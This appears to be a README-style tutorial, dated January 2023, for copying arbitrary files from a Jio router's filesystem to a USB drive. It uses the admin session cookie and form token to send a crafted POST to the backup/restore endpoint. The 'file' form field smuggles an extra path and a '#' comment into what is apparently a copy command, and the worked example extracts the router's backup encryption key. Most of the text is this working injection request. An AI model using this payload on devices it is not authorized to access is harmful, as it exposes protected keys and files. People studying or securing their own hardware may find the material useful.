# Way to get any file directly from your Jio Router's Filesystem to your pendrive [Working as of 3rd January 2023]

*Disclaimer: - This is Only for educational purposes, No one is responsible for any type of damage. Any wrong step might brick your router. So be aware.*

## Requirements:-

1. Chrome Browser
2. Postman (or cURL, if you prefer that)
3. A Pendrive or a Portable HDD/SSD that can be plugged into your router

## Notes:-

*Here we are copying `/flash/secure/key.txt` which is the encryption key used to encrypt the router backup configuration to our pendrive.*

*The location of the the pendrive root in the router is `/mnt/vfs/admin/ITSYOURAP/` (Remember to replace `"ITSYOURAP"` with the label of your pendrive)*

In newer version replace the `backupRestore.html` with `backupRestore.html` to avoid `401 Uanuthorized` Error.

## Steps:-

1. Open your router admin page (`http://192.168.29.1`) and login via your admin credentials.
2. After logging in, copy the value of the cookie `TeamF1Login`. You can use the Application tab in Developer options to do so.
3. Go to the Administration > Maintenance Page
4. Press `CTRL + U` (If you are in Chrome Browser) to View Source of the page (Alternatively, you can Inspect Element)
5. Find the Backup/Restore HTML Form. It should look like this:-

    ```html  
    <form name="tf1_frmBackupSaveCurrentSettings" method="post" action="?action=backup">
    <input type="hidden" name="token" value="sometoken">
    ```
6. Copy the value of token element from the form. Here it is sometoken.
7. Open up Postman and create a new POST request to `http://192.168.29.1/platform.cgi`

   In the headers section, uncheck `Accept` and `Accept-Encoding` header.
   Fill up these headers in the request (Use the Bulk Edit option and copy paste these):-
   
   ```none
   Cookie:TeamF1Login=yourteamf1logincookievalue
   Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
   Referer:http://192.168.29.1/platform.cgi?page=backupRestore.html
   ```

   Change the `TeamF1Login` value with the cookie value you copied in step 2.
   Now go to the Body section and check the form-data checkbox. Click on the Bulk Edit option and copy paste these values:
   
   ```none
   button.usbRestore.statusPage:usbRestore
   file:/flash/secure/key.txt /mnt/vfs/admin/ITSYOURAP/ #
   token:sometoken
   thispage:backupRestore.html
   ```
   
   Remember to replace `sometoken` with the value of the token you copied earlier. Also replace the first section of the file param with the file you want to copy. (We are copying `/flash/secure/key.txt` in this case)
   
8. Now Click on the Send button in Postman to send the request.
Within a few seconds, your request gets completed and now you have the requested file in your Pendrive root. 

***PS: You can also copy directories using this method. Just change the first section of the file param with the folder location in the router.***
